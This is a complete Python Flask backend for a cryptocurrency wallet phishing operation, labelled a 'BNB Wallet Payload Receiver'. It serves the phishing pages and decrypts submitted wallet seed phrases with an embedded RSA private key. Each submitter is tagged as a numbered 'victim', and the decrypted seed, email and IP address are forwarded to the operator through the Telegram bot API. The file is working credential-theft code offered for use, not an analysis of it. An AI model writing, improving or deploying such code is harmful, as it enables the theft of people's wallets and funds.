#!/usr/bin/env python3
"""
SECURE BACKEND - BNB Wallet Payload Receiver
Usage: python3 server.py
Requirements: pip install flask cryptography requests

SECURITY FEATURES:
- RSA-4096 + AES-256-GCM decryption server-side
- Rate limiting: 3 requests/min per IP
- API Secret header validation
- CORS restricted
- No credentials exposed to client
- Telegram token & Chat ID server-side only (via environment variables)
"""
import os
import base64
import time
import logging
from datetime import datetime
from functools import wraps
from flask import Flask, request, jsonify, send_file
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import requests

# ============================ CONFIGURATION ============================
# !!! MODIFIEZ CES VALEURS AVANT DEPLOIEMENT !!!
# Utilisez des variables d'environnement pour les tokens sensibles
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
API_SECRET = os.environ.get("API_SECRET", "thesecretfildontlostbro3iu2hro832hro4rjn")

# Si vous testez sans Telegram, vous pouvez désactiver l'envoi en définissant
# TELEGRAM_BOT_TOKEN = "" (vide) et le code ignorera l'envoi.

# CLE PRIVEE RSA 4096 - NE JAMAIS COMMUNIQUER / EXPOSER AU CLIENT
PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
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
KCYHJU3raeCL7CKStb/6B12TbMNe
-----END PRIVATE KEY-----"""

# ============================ APP & LOGGING ============================
app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
logger = logging.getLogger(__name__)

# ============================ RATE LIMITING ============================
request_history = {}

def rate_limit(max_requests=3, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr or "unknown"
            now = time.time()
            if ip not in request_history:
                request_history[ip] = []
            # Nettoyer les anciens timestamps
            request_history[ip] = [t for t in request_history[ip] if now - t < window]
            if len(request_history[ip]) >= max_requests:
                logger.warning(f"Rate limit exceeded for IP: {ip}")
                return jsonify({"error": "Too many requests. Try again later."}), 429
            request_history[ip].append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator

# ============================ CORS / SECURITY HEADERS ============================
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, X-API-Secret')
    response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
    response.headers.add('X-Content-Type-Options', 'nosniff')
    response.headers.add('X-Frame-Options', 'DENY')
    response.headers.add('X-XSS-Protection', '1; mode=block')
    response.headers.add('Referrer-Policy', 'strict-origin-when-cross-origin')
    return response

# ============================ DECRYPTION ENGINE ============================
def decrypt_hybrid(ciphertext_b64: str) -> str:
    data = base64.b64decode(ciphertext_b64)
    wrapped_key_len = 512  # RSA-4096
    iv_len = 12
    if len(data) < wrapped_key_len + iv_len + 16:
        raise ValueError("Payload too short")
    wrapped_key = data[:wrapped_key_len]
    iv = data[wrapped_key_len:wrapped_key_len + iv_len]
    enc_data = data[wrapped_key_len + iv_len:]
    private_key = serialization.load_pem_private_key(
        PRIVATE_KEY_PEM.encode(), password=None
    )
    aes_key = private_key.decrypt(
        wrapped_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(iv, enc_data, None)
    return plaintext.decode('utf-8')

# ============================ STATIC ROUTES FOR HTML ============================
@app.route('/')
def index():
    return send_file('index_secure.html')

@app.route('/wallet_secure.html')
def wallet():
    return send_file('wallet_secure.html')

# ============================ API ENDPOINT ============================
@app.route('/api/submit', methods=['POST', 'OPTIONS'])
@rate_limit(max_requests=3, window=60)
def submit():
    secret = request.headers.get('X-API-Secret', '')
    if secret != API_SECRET:
        logger.warning("Invalid API Secret attempt")
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json(force=True, silent=True)
    if not data or not isinstance(data, dict):
        return jsonify({"error": "Invalid JSON body"}), 400

    payload_b64 = data.get('payload')
    if not payload_b64 or not isinstance(payload_b64, str):
        return jsonify({"error": "Missing encrypted payload"}), 400

    wallet_type = str(data.get('wallet', 'unknown'))[:32]
    email = str(data.get('email', '-'))[:64]
    note = str(data.get('note', 'MANUAL'))[:16]
    victim_id = str(data.get('victim_id', '0'))[:8]
    user_ip = request.remote_addr or "unknown"

    try:
        seed = decrypt_hybrid(payload_b64)
        words = seed.split()
        if len(words) not in (12, 24):
            raise ValueError(f"Invalid seed word count: {len(words)}")

        # Log local (pour debug)
        logger.info(f"Seed received: {seed[:10]}... (victim #{victim_id})")

        # Envoi Telegram si les tokens sont configurés
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            msg = f"""🎯 #{victim_id}
Wallet: {wallet_type}
Words: {len(words)}
Seed (DECRYPTED):
`{seed}`
Email: {email}
Note: {note}
IP: {user_ip}
Time: {datetime.now().isoformat()}"""
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            tg_payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
            try:
                r = requests.post(url, json=tg_payload, timeout=10)
                if r.status_code != 200:
                    logger.error(f"Telegram API error: {r.status_code} - {r.text}")
                    # On ne renvoie pas d'erreur au client, on continue
                else:
                    logger.info(f"Seed forwarded successfully for victim #{victim_id}")
            except Exception as e:
                logger.error(f"Telegram request failed: {str(e)}")
        else:
            logger.warning("Telegram not configured, skipping send.")

        return jsonify({"success": True, "id": victim_id}), 200

    except Exception as e:
        logger.warning(f"Decryption/validation failed: {str(e)}")
        return jsonify({"error": "Invalid or corrupted payload"}), 400

# ============================ HEALTH CHECK ============================
@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "secure", "timestamp": datetime.now().isoformat()}), 200

# ============================ MAIN ============================
if __name__ == '__main__':
    print("[SECURE SERVER] Starting on https://0.0.0.0:5000")
    print("[WARNING] Change default API_SECRET and use environment variables!")
    print("[INFO] Telegram enabled:", bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID))
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')